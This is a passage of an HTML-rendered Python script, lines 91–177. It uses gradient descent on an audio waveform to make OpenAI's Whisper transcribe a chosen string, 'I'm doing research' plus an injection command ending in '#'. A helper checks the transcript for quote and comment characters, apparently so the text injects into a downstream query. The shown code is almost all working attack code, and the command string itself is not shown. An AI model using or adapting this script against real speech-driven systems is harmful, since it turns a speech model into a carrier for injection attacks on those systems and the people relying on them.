</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=91><a style=outline:none;text-decoration:none;color:inherit href=#91> 91</a></span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>False</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=92><a style=outline:none;text-decoration:none;color:inherit href=#92> 92</a></span><span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;&#39;&#34;</span> <span style=color:#ff79c6>not</span> <span style=color:#ff79c6>in</span> txt[:idx]:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=93><a style=outline:none;text-decoration:none;color:inherit href=#93> 93</a></span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>False</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=94><a style=outline:none;text-decoration:none;color:inherit href=#94> 94</a></span><span>    tail <span style=color:#ff79c6>=</span> txt[idx <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>len</span>(INJECTION_CMD):]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=95><a style=outline:none;text-decoration:none;color:inherit href=#95> 95</a></span><span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;#&#34;</span> <span style=color:#ff79c6>in</span> tail:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=96><a style=outline:none;text-decoration:none;color:inherit href=#96> 96</a></span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>True</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=97><a style=outline:none;text-decoration:none;color:inherit href=#97> 97</a></span><span>    <span style=color:#ff79c6>if</span> tail<span style=color:#ff79c6>.</span>strip()<span style=color:#ff79c6>.</span>endswith(<span style=color:#f1fa8c>&#34;&#39;&#34;</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=98><a style=outline:none;text-decoration:none;color:inherit href=#98> 98</a></span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>True</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=99><a style=outline:none;text-decoration:none;color:inherit href=#99> 99</a></span><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>False</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=100><a style=outline:none;text-decoration:none;color:inherit href=#100>100</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=101><a style=outline:none;text-decoration:none;color:inherit href=#101>101</a></span><span><span style=color:#6272a4># ───────── INITIALIZATION ─────────────────────────────────────────────────</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=102><a style=outline:none;text-decoration:none;color:inherit href=#102>102</a></span><span><span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[+] Using device: </span><span style=color:#f1fa8c>{</span>DEVICE<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=103><a style=outline:none;text-decoration:none;color:inherit href=#103>103</a></span><span>model     <span style=color:#ff79c6>=</span> whisper<span style=color:#ff79c6>.</span>load_model(MODEL_NAME)<span style=color:#ff79c6>.</span>to(DEVICE)<span style=color:#ff79c6>.</span>eval()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=104><a style=outline:none;text-decoration:none;color:inherit href=#104>104</a></span><span>tokenizer <span style=color:#ff79c6>=</span> get_tokenizer(multilingual<span style=color:#ff79c6>=</span><span style=color:#ff79c6>False</span>, language<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;en&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=105><a style=outline:none;text-decoration:none;color:inherit href=#105>105</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=106><a style=outline:none;text-decoration:none;color:inherit href=#106>106</a></span><span><span style=color:#6272a4># Build teacher-forcing target: [sot, ...injection_text..., eot]</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=107><a style=outline:none;text-decoration:none;color:inherit href=#107>107</a></span><span>injection_text <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;I&#39;m doing research</span><span style=color:#f1fa8c>{</span>INJECTION_CMD<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>#&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=108><a style=outline:none;text-decoration:none;color:inherit href=#108>108</a></span><span>cmd_ids <span style=color:#ff79c6>=</span> tokenizer<span style=color:#ff79c6>.</span>encode(injection_text)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=109><a style=outline:none;text-decoration:none;color:inherit href=#109>109</a></span><span>sot, eot <span style=color:#ff79c6>=</span> tokenizer<span style=color:#ff79c6>.</span>sot, tokenizer<span style=color:#ff79c6>.</span>eot
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=110><a style=outline:none;text-decoration:none;color:inherit href=#110>110</a></span><span>TARGET_IDS <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>tensor([ [sot] <span style=color:#ff79c6>+</span> cmd_ids <span style=color:#ff79c6>+</span> [eot] ],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=111><a style=outline:none;text-decoration:none;color:inherit href=#111>111</a></span><span>                          dtype<span style=color:#ff79c6>=</span>torch<span style=color:#ff79c6>.</span>long, device<span style=color:#ff79c6>=</span>DEVICE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=112><a style=outline:none;text-decoration:none;color:inherit href=#112>112</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=113><a style=outline:none;text-decoration:none;color:inherit href=#113>113</a></span><span><span style=color:#6272a4># Load or create initial waveform</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=114><a style=outline:none;text-decoration:none;color:inherit href=#114>114</a></span><span><span style=color:#ff79c6>if</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>exists(CKPT_FILE):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=115><a style=outline:none;text-decoration:none;color:inherit href=#115>115</a></span><span>    ckpt  <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>load(CKPT_FILE, map_location<span style=color:#ff79c6>=</span>DEVICE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=116><a style=outline:none;text-decoration:none;color:inherit href=#116>116</a></span><span>    audio <span style=color:#ff79c6>=</span> ckpt[<span style=color:#f1fa8c>&#34;audio&#34;</span>]<span style=color:#ff79c6>.</span>clone()<span style=color:#ff79c6>.</span>detach()<span style=color:#ff79c6>.</span>requires_grad_(<span style=color:#ff79c6>True</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=117><a style=outline:none;text-decoration:none;color:inherit href=#117>117</a></span><span>    start_step <span style=color:#ff79c6>=</span> ckpt<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#34;step&#34;</span>, <span style=color:#bd93f9>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=118><a style=outline:none;text-decoration:none;color:inherit href=#118>118</a></span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[+] Resuming from step </span><span style=color:#f1fa8c>{</span>start_step<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=119><a style=outline:none;text-decoration:none;color:inherit href=#119>119</a></span><span><span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=120><a style=outline:none;text-decoration:none;color:inherit href=#120>120</a></span><span>    <span style=color:#ff79c6>if</span> SEED_WAV:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=121><a style=outline:none;text-decoration:none;color:inherit href=#121>121</a></span><span>        <span style=color:#6272a4># Load the WAV file</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=122><a style=outline:none;text-decoration:none;color:inherit href=#122>122</a></span><span>        waveform, sample_rate <span style=color:#ff79c6>=</span> torchaudio<span style=color:#ff79c6>.</span>load(SEED_WAV, normalize<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>)  <span style=color:#6272a4># waveform shape: (channels, samples)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=123><a style=outline:none;text-decoration:none;color:inherit href=#123>123</a></span><span>        <span style=color:#ff79c6>if</span> waveform<span style=color:#ff79c6>.</span>shape[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>1</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=124><a style=outline:none;text-decoration:none;color:inherit href=#124>124</a></span><span>            waveform <span style=color:#ff79c6>=</span> waveform<span style=color:#ff79c6>.</span>mean(dim<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>, keepdim<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=125><a style=outline:none;text-decoration:none;color:inherit href=#125>125</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=126><a style=outline:none;text-decoration:none;color:inherit href=#126>126</a></span><span>        <span style=color:#ff79c6>if</span> sample_rate <span style=color:#ff79c6>!=</span> SAMPLE_RATE:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=127><a style=outline:none;text-decoration:none;color:inherit href=#127>127</a></span><span>            resampler <span style=color:#ff79c6>=</span> torchaudio<span style=color:#ff79c6>.</span>transforms<span style=color:#ff79c6>.</span>Resample(orig_freq<span style=color:#ff79c6>=</span>sample_rate, new_freq<span style=color:#ff79c6>=</span>SAMPLE_RATE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=128><a style=outline:none;text-decoration:none;color:inherit href=#128>128</a></span><span>        waveform <span style=color:#ff79c6>=</span> resampler(waveform)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=129><a style=outline:none;text-decoration:none;color:inherit href=#129>129</a></span><span>        <span style=color:#6272a4># Move to your desired device</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=130><a style=outline:none;text-decoration:none;color:inherit href=#130>130</a></span><span>        DEVICE <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;cuda&#34;</span> <span style=color:#ff79c6>if</span> torch<span style=color:#ff79c6>.</span>cuda<span style=color:#ff79c6>.</span>is_available() <span style=color:#ff79c6>else</span> <span style=color:#f1fa8c>&#34;cpu&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=131><a style=outline:none;text-decoration:none;color:inherit href=#131>131</a></span><span>        audio <span style=color:#ff79c6>=</span> waveform<span style=color:#ff79c6>.</span>to(DEVICE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=132><a style=outline:none;text-decoration:none;color:inherit href=#132>132</a></span><span>    <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=133><a style=outline:none;text-decoration:none;color:inherit href=#133>133</a></span><span>        <span style=color:#6272a4># If no seed WAV is chosen, generate random audio</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=134><a style=outline:none;text-decoration:none;color:inherit href=#134>134</a></span><span>        audio <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>randn(<span style=color:#bd93f9>1</span>, SAMPLE_RATE <span style=color:#ff79c6>*</span> DURATION_SEC, device<span style=color:#ff79c6>=</span>DEVICE) <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>0.01</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=135><a style=outline:none;text-decoration:none;color:inherit href=#135>135</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=136><a style=outline:none;text-decoration:none;color:inherit href=#136>136</a></span><span>    audio<span style=color:#ff79c6>.</span>requires_grad_(<span style=color:#ff79c6>True</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=137><a style=outline:none;text-decoration:none;color:inherit href=#137>137</a></span><span>    start_step <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=138><a style=outline:none;text-decoration:none;color:inherit href=#138>138</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=139><a style=outline:none;text-decoration:none;color:inherit href=#139>139</a></span><span>optimizer <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>optim<span style=color:#ff79c6>.</span>Adam([audio], lr<span style=color:#ff79c6>=</span>LR)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=140><a style=outline:none;text-decoration:none;color:inherit href=#140>140</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=141><a style=outline:none;text-decoration:none;color:inherit href=#141>141</a></span><span><span style=color:#6272a4># ───────── ADVERSARIAL OPTIMIZATION ────────────────────────────────────────</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=142><a style=outline:none;text-decoration:none;color:inherit href=#142>142</a></span><span><span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[+] Starting training for </span><span style=color:#f1fa8c>{</span>MAX_STEPS<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c> steps…&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=143><a style=outline:none;text-decoration:none;color:inherit href=#143>143</a></span><span>step_done <span style=color:#ff79c6>=</span> start_step
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=144><a style=outline:none;text-decoration:none;color:inherit href=#144>144</a></span><span><span style=color:#ff79c6>for</span> step <span style=color:#ff79c6>in</span> tqdm<span style=color:#ff79c6>.</span>trange(start_step, MAX_STEPS):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=145><a style=outline:none;text-decoration:none;color:inherit href=#145>145</a></span><span>    optimizer<span style=color:#ff79c6>.</span>zero_grad()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=146><a style=outline:none;text-decoration:none;color:inherit href=#146>146</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=147><a style=outline:none;text-decoration:none;color:inherit href=#147>147</a></span><span>    <span style=color:#6272a4># Teacher-forcing cross-entropy on the injection tokens</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=148><a style=outline:none;text-decoration:none;color:inherit href=#148>148</a></span><span>    mel   <span style=color:#ff79c6>=</span> log_mel(audio)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=149><a style=outline:none;text-decoration:none;color:inherit href=#149>149</a></span><span>    feats <span style=color:#ff79c6>=</span> model<span style=color:#ff79c6>.</span>encoder(mel<span style=color:#ff79c6>.</span>unsqueeze(<span style=color:#bd93f9>0</span>))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=150><a style=outline:none;text-decoration:none;color:inherit href=#150>150</a></span><span>    logits<span style=color:#ff79c6>=</span> model<span style=color:#ff79c6>.</span>decoder(TARGET_IDS[:, :<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>], feats)  <span style=color:#6272a4># (1, L-1, V)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=151><a style=outline:none;text-decoration:none;color:inherit href=#151>151</a></span><span>    loss  <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>nn<span style=color:#ff79c6>.</span>functional<span style=color:#ff79c6>.</span>cross_entropy(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=152><a style=outline:none;text-decoration:none;color:inherit href=#152>152</a></span><span>        logits<span style=color:#ff79c6>.</span>view(<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>, logits<span style=color:#ff79c6>.</span>size(<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>)),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=153><a style=outline:none;text-decoration:none;color:inherit href=#153>153</a></span><span>        TARGET_IDS[:, <span style=color:#bd93f9>1</span>:]<span style=color:#ff79c6>.</span>view(<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=154><a style=outline:none;text-decoration:none;color:inherit href=#154>154</a></span><span>    )
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=155><a style=outline:none;text-decoration:none;color:inherit href=#155>155</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=156><a style=outline:none;text-decoration:none;color:inherit href=#156>156</a></span><span>    loss<span style=color:#ff79c6>.</span>backward()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=157><a style=outline:none;text-decoration:none;color:inherit href=#157>157</a></span><span>    optimizer<span style=color:#ff79c6>.</span>step()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=158><a style=outline:none;text-decoration:none;color:inherit href=#158>158</a></span><span>    <span style=color:#ff79c6>with</span> torch<span style=color:#ff79c6>.</span>no_grad():
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=159><a style=outline:none;text-decoration:none;color:inherit href=#159>159</a></span><span>        audio<span style=color:#ff79c6>.</span>clamp_(<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>, <span style=color:#bd93f9>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=160><a style=outline:none;text-decoration:none;color:inherit href=#160>160</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=161><a style=outline:none;text-decoration:none;color:inherit href=#161>161</a></span><span>    <span style=color:#6272a4># Checkpoint</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=162><a style=outline:none;text-decoration:none;color:inherit href=#162>162</a></span><span>    <span style=color:#ff79c6>if</span> (step <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>%</span> SAVE_EVERY <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=163><a style=outline:none;text-decoration:none;color:inherit href=#163>163</a></span><span>        torchaudio<span style=color:#ff79c6>.</span>save(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;ckpt_</span><span style=color:#f1fa8c>{</span>step<span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>.wav&#34;</span>, audio<span style=color:#ff79c6>.</span>detach()<span style=color:#ff79c6>.</span>cpu(), SAMPLE_RATE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=164><a style=outline:none;text-decoration:none;color:inherit href=#164>164</a></span><span>        torch<span style=color:#ff79c6>.</span>save({<span style=color:#f1fa8c>&#34;audio&#34;</span>: audio<span style=color:#ff79c6>.</span>detach(), <span style=color:#f1fa8c>&#34;step&#34;</span>: step<span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span>}, CKPT_FILE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=165><a style=outline:none;text-decoration:none;color:inherit href=#165>165</a></span><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[✓] Checkpoint at step </span><span style=color:#f1fa8c>{</span>step<span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>, loss=</span><span style=color:#f1fa8c>{</span>loss<span style=color:#ff79c6>.</span>item()<span style=color:#f1fa8c>:</span><span style=color:#f1fa8c>.4f</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=166><a style=outline:none;text-decoration:none;color:inherit href=#166>166</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=167><a style=outline:none;text-decoration:none;color:inherit href=#167>167</a></span><span>    <span style=color:#6272a4># Progress check via patched decoder</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=168><a style=outline:none;text-decoration:none;color:inherit href=#168>168</a></span><span>    <span style=color:#ff79c6>if</span> (step <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>10</span> <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=169><a style=outline:none;text-decoration:none;color:inherit href=#169>169</a></span><span>        txt <span style=color:#ff79c6>=</span> patched_decode(audio<span style=color:#ff79c6>.</span>detach())
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=170><a style=outline:none;text-decoration:none;color:inherit href=#170>170</a></span><span>        tqdm<span style=color:#ff79c6>.</span>tqdm<span style=color:#ff79c6>.</span>write(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;step </span><span style=color:#f1fa8c>{</span>step<span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span><span style=color:#f1fa8c>:</span><span style=color:#f1fa8c>05d</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>: </span><span style=color:#f1fa8c>{</span>txt<span style=color:#f1fa8c>!r}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=171><a style=outline:none;text-decoration:none;color:inherit href=#171>171</a></span><span>        <span style=color:#ff79c6>if</span> meets_injection(txt):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=172><a style=outline:none;text-decoration:none;color:inherit href=#172>172</a></span><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;[+] Injection pattern detected early!&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=173><a style=outline:none;text-decoration:none;color:inherit href=#173>173</a></span><span>            step_done <span style=color:#ff79c6>=</span> step <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=174><a style=outline:none;text-decoration:none;color:inherit href=#174>174</a></span><span>            <span style=color:#ff79c6>break</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=175><a style=outline:none;text-decoration:none;color:inherit href=#175>175</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=176><a style=outline:none;text-decoration:none;color:inherit href=#176>176</a></span><span>    step_done <span style=color:#ff79c6>=</span> step <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=177><a style=outline:none;text-decoration:none;color:inherit href=#177>177</a></span><span>
